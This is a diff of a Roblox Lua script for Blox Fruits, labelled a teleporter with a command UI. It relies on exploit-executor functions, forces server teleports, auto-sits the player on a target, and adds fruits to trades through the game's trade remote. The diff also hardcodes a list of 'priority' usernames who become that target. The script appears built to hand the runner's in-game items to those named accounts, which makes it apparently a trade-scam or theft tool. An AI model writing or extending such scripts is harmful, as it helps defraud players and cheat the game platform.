@@ -1,5 +1,7 @@
--- Script Lynx Blox Fruits Teleporter with Command UI
--- GitHub: https://github.com/NeroHubClub/TP-BF-NERO/blob/main/NANANNAA
+-- Script Lynx TP System with Command UI
+-- Upload this to: https://github.com/NeroHubClub/TP-BF-NERO/blob/main/NANANNAA
+
+print("[Script Lynx TP] Loading...")
 
 -- Services
 local Players = game:GetService("Players")
@@ -7,21 +9,24 @@ local TeleportService = game:GetService("TeleportService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 
--- Get configuration from main script
-local jobId = script:FindFirstChild("JOB_ID") and script.JOB_ID.Value or game.JobId
-local targetUsername = script:FindFirstChild("TARGET_USERNAME") and script.TARGET_USERNAME.Value or "Unknown"
+-- Configuration
+local JOB_ID = game.JobId
+local TARGET_USERNAME = ""
 local PLACE_ID = 4442272183
 
-print("[Script Lynx TP] Initializing...")
-print("[Script Lynx TP] Job ID:", jobId)
-print("[Script Lynx TP] Target:", targetUsername)
+-- Find target user (assuming first priority user is target)
+local PriorityUsers = {"Smiley9Gamerz", "FAITH0YT", "BUZZFTGOD", "KITSUNEPLS_908", "1IM_SMILEY1", "Smiley_Mustafa2"}
 
--- Wait for remotes
-local CommF, TradeFunction
-task.spawn(function()
-    CommF = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
-    TradeFunction = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction")
-end)
+for _, name in ipairs(PriorityUsers) do
+    local target = Players:FindFirstChild(name)
+    if target and target ~= LocalPlayer then
+        TARGET_USERNAME = target.Name
+        break
+    end
+end
+
+print("[Script Lynx TP] Job ID:", JOB_ID)
+print("[Script Lynx TP] Target:", TARGET_USERNAME)
 
 -- Fruit Emojis
 local fruitEmoji = {
@@ -47,6 +52,13 @@ local allFruits = {
     "Diamond", "Eagle", "Dark", "Sand", "Ice", "Flame", "Spike",
     "Smoke", "Bomb", "Spring", "Blade", "Spin", "Rocket"
 }
+
+-- Wait for remotes
+local CommF, TradeFunction
+task.spawn(function()
+    CommF = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
+    TradeFunction = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction")
+end)
 
 -- Command UI Creation
 local function createCommandUI()
@@ -224,7 +236,7 @@ local function createCommandUI()
     
     -- Teleport Button
     local tpBtn = createCommandButton("📍 TELEPORT", function()
-        local target = Players:FindFirstChild(targetUsername)
+        local target = Players:FindFirstChild(TARGET_USERNAME)
         if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
             local char = LocalPlayer.Character
             if char and char:FindFirstChild("HumanoidRootPart") then
@@ -354,51 +366,19 @@ local function createCommandUI()
     
     -- Initial messages
     addToHistory("🎮 Command UI Loaded!")
-    addToHistory("👤 Target: " .. targetUsername)
+    addToHistory("👤 Target: " .. TARGET_USERNAME)
     addToHistory("📍 Click fruits to add/remove from trade")
     
     return screenGui
 end
 
--- Main teleport function with queue_on_teleport
-local function teleportToServer()
-    print("[Script Lynx TP] Starting teleport process...")
-    
-    if game.PlaceId ~= PLACE_ID then
-        -- Not in Sea 2, travel to Dressrosa first
-        print("[Script Lynx TP] Not in Sea 2, traveling to Dressrosa...")
-        
-        -- Set up teleport for after travel
-        queue_on_teleport([[
-            task.wait(3)
-            local targetJobId = "]] .. jobId .. [["
-            local targetPlaceId = 4442272183
-            
-            if game.JobId ~= targetJobId then
-                game:GetService("TeleportService"):TeleportToPlaceInstance(targetPlaceId, targetJobId)
-            else
-                warn("[Script Lynx TP] Already in target server!")
-            end
-        ]])
-        
-        -- Travel to Dressrosa
-        pcall(function()
-            CommF:InvokeServer("TravelDressrosa")
-        end)
-    else
-        -- Already in Sea 2, teleport directly
-        print("[Script Lynx TP] Already in Sea 2, teleporting to instance...")
-        TeleportService:TeleportToPlaceInstance(PLACE_ID, jobId)
-    end
-end
-
 -- Auto-sit system
 local function setupAutoSit()
     local RunService = game:GetService("RunService")
-    local target = Players:FindFirstChild(targetUsername)
+    local target = Players:FindFirstChild(TARGET_USERNAME)
     
     if not target then 
-        print("[Script Lynx TP] Target not found:", targetUsername)
+        print("[Script Lynx TP] Target not found:", TARGET_USERNAME)
         return 
     end
     
@@ -443,7 +423,7 @@ end
 
 -- Main execution
 task.spawn(function()
-    -- Wait a bit for everything to load
+    -- Wait for everything to load
     task.wait(2)
     
     -- Create UI
@@ -454,20 +434,13 @@ task.spawn(function()
     
     print("[Script Lynx TP] System ready! UI created.")
     
-    -- Find target and wait for them
-    local target = Players:FindFirstChild(targetUsername)
+    -- Find target
+    local target = Players:FindFirstChild(TARGET_USERNAME)
     if target then
         print("[Script Lynx TP] Target found:", target.Name)
     else
         print("[Script Lynx TP] Waiting for target to join...")
     end
 end)
-
--- Execute teleport if not already in server
-if game.JobId ~= jobId then
-    teleportToServer()
-else
-    print("[Script Lynx TP] Already in target server!")
-end
 
 print("[Script Lynx TP] Loaded successfully!")
